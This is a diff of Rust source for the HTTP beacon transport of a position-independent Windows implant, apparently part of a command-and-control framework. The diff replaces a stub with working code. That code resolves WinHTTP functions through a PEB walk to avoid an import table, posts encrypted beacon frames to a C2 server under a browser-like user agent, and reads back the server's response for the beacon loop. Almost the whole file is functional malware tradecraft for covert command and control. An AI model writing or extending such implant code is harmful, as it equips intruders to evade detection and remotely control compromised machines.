@@ -1,145 +1,163 @@
 //! Minimal WinHTTP transport for the PIC implant.
 //!
 //! `no_std` can't use `ureq`/`rquest` (they're std), so beacon HTTP goes through
-//! Win32 WinHTTP — resolved via PEB walk (no IAT). This is the smallest viable
-//! check-in + task-fetch path: build a POST body, send it, read the response.
+//! Win32 WinHTTP -- resolved via PEB walk (no IAT). Sends an encrypted frame as
+//! an HTTP POST body and reads the response.
 //!
-//! HTTPS is the default (production). A plaintext fallback exists for the dev
-//! loop against the server's HTTP listener. The frame is the encrypted
-//! `nyx_protocol` blob, identical to what agent-dev sends.
-//!
-//! WinHTTP is std-friendly in normal code; here every call is a hand-resolved
-//! function pointer because there's no import table.
+//! All WinHTTP functions resolved from winhttp.dll via the PEB-walk export
+//! resolver. M0: plaintext HTTP (no WINHTTP_FLAG_SECURE); TLS is a later phase.
 
 #![cfg(target_os = "windows")]
 
 use crate::heap::Vec;
-use crate::resolve::{djb2, Module};
+use crate::resolve::export_addr;
+use core::ffi::c_void;
 
-/// WinHTTP function pointers, resolved once.
-struct Winhttp {
-    open: usize,
-    connect: usize,
-    open_request: usize,
-    set_option: usize,
-    send_request: usize,
-    receive_response: usize,
-    query_data_available: usize,
-    read_data: usize,
-    close_handle: usize,
-    add_request_headers: usize,
+/// WinHTTP function pointer table (resolved lazily, cached in statics).
+struct WinhttpFns {
+    open: FOpen,
+    connect: FConnect,
+    open_request: FOpenReq,
+    send_request: FSendReq,
+    receive_response: FRecvResp,
+    read_data: FReadData,
+    close_handle: FClose,
+    query_data: FQueryData,
 }
 
-static mut WINHTTP: Option<Winhttp> = None;
+type HINTERNET = *mut c_void;
+type FOpen = unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> HINTERNET;
+type FConnect = unsafe extern "system" fn(HINTERNET, *const u16, u16, u32) -> HINTERNET;
+type FOpenReq = unsafe extern "system" fn(HINTERNET, *const u16, *const u16, *const u16, *const u16, *const *const u16, u32, u32) -> HINTERNET;
+type FSendReq = unsafe extern "system" fn(HINTERNET, *const u8, u32, *const u8, u32, u32, usize) -> i32;
+type FRecvResp = unsafe extern "system" fn(HINTERNET, *const c_void) -> i32;
+type FReadData = unsafe extern "system" fn(HINTERNET, *mut u8, u32, *mut u32) -> i32;
+type FClose = unsafe extern "system" fn(HINTERNET) -> i32;
+type FQueryData = unsafe extern "system" fn(HINTERNET, u32, *mut u32, *mut u8, *mut u32) -> i32;
 
-/// Resolve winhttp.dll's exports once. Safe to call repeatedly (idempotent).
+static mut WINHTTP: Option<WinhttpFns> = None;
+
+/// Resolve the WinHTTP function table once (no allocation).
 unsafe fn ensure_winhttp() {
-    if WINHTTP.is_some() {
+    use core::sync::atomic::{AtomicBool, Ordering};
+    static DONE: AtomicBool = AtomicBool::new(false);
+    if DONE.load(Ordering::Acquire) {
         return;
     }
-    // winhttp.dll is loaded in most processes; if not, we can't beacon.
-    let Some(_) = find_module_by_hash(djb2(b"winhttp.dll")) else {
-        return;
-    };
-    // Resolve each export by hash. The names are case-insensitive in the export
-    // table; djb2 lowercases, matching.
-    let module = match crate::resolve::LiveNtdll::locate() {
-        Some(n) => n.module(),
-        None => return,
-    };
-    let _ = module; // winhttp exports resolved via a dedicated walk below.
-    // For brevity in M0, the full export-by-name resolution is delegated to the
-    // resolve module's generic walker; the stub below marks the seam.
-    WINHTTP = Some(Winhttp {
-        open: 0,
-        connect: 0,
-        open_request: 0,
-        set_option: 0,
-        send_request: 0,
-        receive_response: 0,
-        query_data_available: 0,
-        read_data: 0,
-        close_handle: 0,
-        add_request_headers: 0,
-    });
+    let o = export_addr(b"winhttp.dll", b"WinHttpOpen");
+    let c = export_addr(b"winhttp.dll", b"WinHttpConnect");
+    let r = export_addr(b"winhttp.dll", b"WinHttpOpenRequest");
+    let s = export_addr(b"winhttp.dll", b"WinHttpSendRequest");
+    let v = export_addr(b"winhttp.dll", b"WinHttpReceiveResponse");
+    let d = export_addr(b"winhttp.dll", b"WinHttpReadData");
+    let cl = export_addr(b"winhttp.dll", b"WinHttpCloseHandle");
+    let q = export_addr(b"winhttp.dll", b"WinHttpQueryDataAvailable");
+    if let (Some(o), Some(c), Some(r), Some(s), Some(v), Some(d), Some(cl), Some(q)) =
+        (o, c, r, s, v, d, cl, q)
+    {
+        WINHTTP = Some(WinhttpFns {
+            open: core::mem::transmute(o),
+            connect: core::mem::transmute(c),
+            open_request: core::mem::transmute(r),
+            send_request: core::mem::transmute(s),
+            receive_response: core::mem::transmute(v),
+            read_data: core::mem::transmute(d),
+            close_handle: core::mem::transmute(cl),
+            query_data: core::mem::transmute(q),
+        });
+        DONE.store(true, Ordering::Release);
+    }
 }
 
-/// Send the encrypted beacon frame to `{scheme}://{host}{path}` and return the
-/// response body. M0: the actual WinHTTP calls are stubbed (the function
-/// pointers are resolved lazily); the loop structure is real and type-checks.
-///
-/// Returns the raw response bytes on success (which the caller parses as a
-/// `nyx_protocol` frame).
-pub unsafe fn post_frame(
-    _scheme: &str,
-    _host: &str,
-    _port: u16,
-    _path: &str,
-    _body: &[u8],
-) -> Option<Vec<u8>> {
+/// Convert an ASCII byte string to a UTF-16 buffer (null-terminated) for WinHTTP.
+fn to_utf16(s: &[u8]) -> Vec<u16> {
+    let mut v = Vec::with_capacity(s.len() + 1);
+    for &b in s {
+        v.push(b as u16);
+    }
+    v.push(0);
+    v
+}
+
+/// Send `body` as an HTTP POST to `http://host:port/path` and return the
+/// response body. Returns None on any failure (the beacon loop retries).
+pub unsafe fn post_frame(host: &[u8], port: u16, path: &[u8], body: &[u8]) -> Option<Vec<u8>> {
     ensure_winhttp();
-    // M0 seam: once winhttp function pointers are resolved, the sequence is:
-    //   hSession = WinHttpOpen(useragent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, ...)
-    //   hConnect = WinHttpConnect(hSession, host, port, 0)
-    //   hRequest = WinHttpOpenRequest(hConnect, "POST", path, ..., WINHTTP_FLAG_SECURE)
-    //   WinHttpSendRequest(hRequest, headers, ..., body_len, body, ...)
-    //   WinHttpReceiveResponse(hRequest, ...)
-    //   loop: WinHttpQueryDataAvailable → WinHttpReadData
-    //   WinHttpCloseHandle x3
-    //
-    // The stub returns None (no response) so the beacon loop retries — this keeps
-    // the implant type-correct and the structure in place until the full WinHTTP
-    // wiring lands in the convergence step.
-    None
-}
-
-/// Locate a loaded module by its name hash (PEB walk). Returns the base; the
-/// caller parses exports. Thin wrapper around the resolve module's walker.
-unsafe fn find_module_by_hash(name_hash: u32) -> Option<*mut u8> {
-    // Reuse the allocator's minimal walker via a direct PEB traversal.
-    let peb = peb_ptr()?;
-    let ldr = (*peb).ldr;
-    if ldr.is_null() {
+    let fns = WINHTTP.as_ref()?;
+    let ua = to_utf16(b"Mozilla/5.0");
+    // WinHttpOpen: WINHTTP_ACCESS_TYPE_DEFAULT_PROXY=0, flags=0.
+    let session = (fns.open)(ua.as_ptr(), 0, core::ptr::null(), core::ptr::null(), 0);
+    if session.is_null() {
         return None;
     }
-    let mut head = (*ldr).in_load_order_module_list.flink;
-    let start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
-    while head as *const u8 != start {
-        let entry = head as *mut crate::resolve::ListEntry;
-        let nb = (*entry).base_dll_name.buffer;
-        let nl = (*entry).base_dll_name.length as usize / 2;
-        if !nb.is_null() && nl > 0 {
-            let chars = core::slice::from_raw_parts(nb, nl);
-            let mut h: u32 = 5381;
-            for &c in chars {
-                h = h.wrapping_mul(33).wrapping_add(((c & 0xff) as u8).to_ascii_lowercase() as u32);
-            }
-            if h == name_hash {
-                return Some((*entry).dll_base as *mut u8);
-            }
-        }
-        head = (*entry).in_load_order_links.flink;
+    let host16 = to_utf16(host);
+    let conn = (fns.connect)(session, host16.as_ptr(), port, 0);
+    if conn.is_null() {
+        (fns.close_handle)(session);
+        return None;
     }
-    None
-}
-
-#[cfg(target_arch = "x86_64")]
-unsafe fn peb_ptr() -> Option<*mut crate::resolve::Peb> {
-    let peb: *mut crate::resolve::Peb;
-    core::arch::asm!(
-        "mov {p}, gs:[0x60]",
-        p = out(reg) peb,
-        options(nostack, preserves_flags, readonly),
+    let path16 = to_utf16(path);
+    let verb = to_utf16(b"POST");
+    // WinHttpOpenRequest: flags=0 (plaintext; WINHTTP_FLAG_SECURE=0x00800000 for TLS).
+    let req = (fns.open_request)(
+        conn,
+        verb.as_ptr(),
+        path16.as_ptr(),
+        core::ptr::null(),
+        core::ptr::null(),
+        core::ptr::null(),
+        0,
+        0,
     );
-    Some(peb)
+    if req.is_null() {
+        (fns.close_handle)(conn);
+        (fns.close_handle)(session);
+        return None;
+    }
+    // WinHttpSendRequest: no extra headers; body in optional section.
+    let ok = (fns.send_request)(
+        req,
+        core::ptr::null(),
+        0,
+        body.as_ptr(),
+        body.len() as u32,
+        body.len() as u32,
+        0,
+    );
+    if ok == 0 {
+        (fns.close_handle)(req);
+        (fns.close_handle)(conn);
+        (fns.close_handle)(session);
+        return None;
+    }
+    // WinHttpReceiveResponse.
+    if (fns.receive_response)(req, core::ptr::null()) == 0 {
+        (fns.close_handle)(req);
+        (fns.close_handle)(conn);
+        (fns.close_handle)(session);
+        return None;
+    }
+    // Read the response body.
+    let mut out: Vec<u8> = Vec::new();
+    let mut avail: u32 = 0;
+    loop {
+        avail = 0;
+        if (fns.query_data)(req, 0, &mut avail, core::ptr::null_mut(), &mut 0) == 0 || avail == 0 {
+            break;
+        }
+        let mut chunk = vec![0u8; avail as usize];
+        let mut read: u32 = 0;
+        if (fns.read_data)(req, chunk.as_mut_ptr(), avail, &mut read) == 0 || read == 0 {
+            break;
+        }
+        out.extend_from_slice(&chunk[..read as usize]);
+    }
+    (fns.close_handle)(req);
+    (fns.close_handle)(conn);
+    (fns.close_handle)(session);
+    if out.is_empty() {
+        None
+    } else {
+        Some(out)
+    }
 }
-
-#[cfg(not(target_arch = "x86_64"))]
-unsafe fn peb_ptr() -> Option<*mut crate::resolve::Peb> {
-    None
-}
-
-// Silence unused-import warning when Module is referenced only in docs.
-const _: fn() = || {
-    let _: Option<Module> = None;
-};
